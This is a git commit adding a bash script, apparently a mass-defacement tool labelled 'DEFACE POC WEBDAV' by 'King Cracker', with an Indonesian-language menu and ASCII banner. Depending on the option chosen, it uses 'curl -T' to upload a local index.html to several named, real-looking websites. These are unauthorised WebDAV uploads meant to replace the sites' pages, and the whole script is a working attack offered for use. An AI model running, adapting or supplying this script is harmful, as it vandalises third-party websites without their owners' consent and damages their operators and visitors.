e6983fa1353300efa00fa2a6c78003e808aa29b6
MR.51MB4H <48198896+kingcracker@users.noreply.github.com>
2019-07-27 08:38:35 +0700

    Add files via upload

---
+++ Webdav2.sh
@@ -0,0 +1,140 @@
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'                                                cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+echo 
+echo "█████████"  | lolcat
+echo "█▄█████▄█  \033[32;1m●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬● " | lolcat
+echo "█ ▼▼▼▼▼               ┬┌─  ╔═╗ " | lolcat
+echo "█                     ├┴┐  ║ " | lolcat
+echo "█ ▲▲▲▲▲               ┴ ┴  ╚═╝   " | lolcat
+echo "█████████     ☠◢◤◢█◆━━━━◆⚔⚔◆━━━◆█◣◥◣☠ " | lolcat
+ echo " ██ ██ " | lolcat
+echo $cyan "╔════════════════════════════════════════════════╗" 
+echo $cyan "║ * \033[37;1m[Author]  : \033[33;1mKING CRACKER                     \033[36;1m║ "
+echo $cyan "║ * \033[33;1m[GitHub]  : \033[37;1mhttps://github.com/kingcracker   \033[36;1m║"
+echo $cyan "║ * \033[37;1m[TOOLS]   : \033[33;1mDEFACE POC WEBDAV               \033[36;1m ║"
+echo $cyan "║ * \033[33;1m[Versi]   : \033[37;1m1.9                              \033[36;1m║"
+echo $cyan "╚════════════════════════════════════════════════╝"
+echo $cyan "  ║                        ║"
+echo $cyan "╔═════════════════════════════╗"
+date | lolcat
+echo $cyan "╚═════════════════════════════╝"
+echo $green "Rename Dulu Script Dengan index.html"
+sleep 3
+echo $blue "╔═════════════════════════════╗"
+echo $purple "═║\033[37;1mA. \033[32;1m2 Web                    \033[35;1m║"
+echo $blue "╚═════════════════════════════╝"
+echo $blue "╔═════════════════════════════╗"
+echo $purple "═║\033[37;1mB. \033[32;1m4 Web                     \033[35;1m║"
+echo $blue "╚═════════════════════════════╝"
+echo $blue "╔═════════════════════════════╗"
+echo $purple "═║\033[37;1mC. \033[32;1m6 Web                    \033[35;1m║"
+echo $blue "╚═════════════════════════════╝"
+echo $blue "╔═════════════════════════════╗"
+echo $purple "═║\033[37;1mD. \033[32;1mEXIT                     \033[35;1m║"
+echo $blue "╚═════════════════════════════╝"
+echo
+echo $green "TENTUKAN PILIHAN LU NYET!"
+read -p "#KC~GANS=>" KC;
+
+if [ $KC = A ] || [ $KC = a ]
+then
+clear
+figlet "2 WEB" | lolcat
+echo
+echo
+echo $white "AUTHOR : King Cracker"
+echo $cyan "Ingat Nama Script Harus index.html Njing!!"
+echo $green "PROSES CUK!!.."
+sleep 3
+curl -T /storage/emulated/0/index.html http://ayk.co.za/
+curl -T /storage/emulated/0/index.html http://scnc.co.za/
+curl -T /storage/emulated/0/index.html http://stand66.com/
+echo $green "HASILNYA NJING :"
+echo $cyan "http://ayk.co.za"
+echo $yellow "http://scnc.co.za"
+echo
+sleep 1
+echo $cyan "Ok, Njing Sudah Selesai"
+echo $green "Silahkan Lihat di Browser"
+echo $yellow "Thx Udah Gunakan Tool Ini"
+echo $cyan "See You Next Time"
+fi
+
+if [ $KC = B ] || [ $KC = b ]
+then
+clear
+figlet "4 WEB" | lolcat
+echo
+echo
+echo $white "AUTHOR : King Cracker"
+echo $cyan "Ingat Nama Script Harus index.html Njing!!"
+echo $green "PROSES CUK!!.."
+sleep 3
+curl -T /storage/emulated/0/index.html http://ayk.co.za/
+curl -T /storage/emulated/0/index.html http://scnc.co.za/
+curl -T /storage/emulated/0/index.html http://stand66.com
+curl -T /storage/emulated/0/index.html http://mix007.co.za
+echo $green "HASILNYA NJING :"
+echo $cyan "http://ayk.co.za"
+echo $yellow "http://scnc.co.za"
+echo $green "http://stand66.com"
+echo $cyan "http://mix007.co.za"
+echo
+sleep 1
+echo $cyan "Ok, Njing Sudah Selesai"
+echo $green "Silahkan Lihat di Browser"
+echo $yellow "Thx Udah Gunakan Tool Ini"
+echo $cyan "See You Next Time"
+fi
+
+if [ $KC = C ] || [ $KC = C ]
+then
+clear
+figlet "6 WEB" | lolcat
+echo
+echo
+echo $white "AUTHOR : King Cracker"
+echo $cyan "Ingat Nama Script Harus index.html Njing!!"
+echo $green "PROSES CUK!!.."
+sleep 3
+curl -T /storage/emulated/0/index.html http://ayk.co.za/
+curl -T /storage/emulated/0/index.html http://scnc.co.za/
+curl -T /storage/emulated/0/index.html http://stand66.com
+curl -T /storage/emulated/0/index.html http://mix007.co.za
+curl -T /storage/emulated/0/index.html http://contsol.co.za/
+curl -T /storage/emulated/0/index.html http://tcmgroup.co.za
+echo $green "HASILNYA NJING :"
+echo $cyan "http://ayk.co.za"
+echo $yellow "http://scnc.co.za"
+echo $green "http://stand66.com"
+echo $cyan "http://mix007.co.za"
+echo $yellow "http://contsol.co.za"
+echo $cyan "http://tcmgroup.co.za"
+echo
+sleep 1
+echo $cyan "Ok, Njing Sudah Selesai"
+echo $green "Silahkan Lihat di Browser"
+echo $yellow "Thx Udah Gunakan Tool Ini"
+echo $cyan "See You Next Time"
+fi
+
+if [ $KC = D ] || [ $KC = d ]
+then
+clear
+figlet "EXIT" | lolcat
+echo
+echo
+echo $cyan "Otw, Out Cuk"
+sleep 1
+echo $green "Jangan Recode ni Script :)"
+sleep 1
+echo $yellow "Thx Udah Gunakan Tool Ini"
+sleep 1
+echo $cyan "See You Next Time....."
+exit
+fi
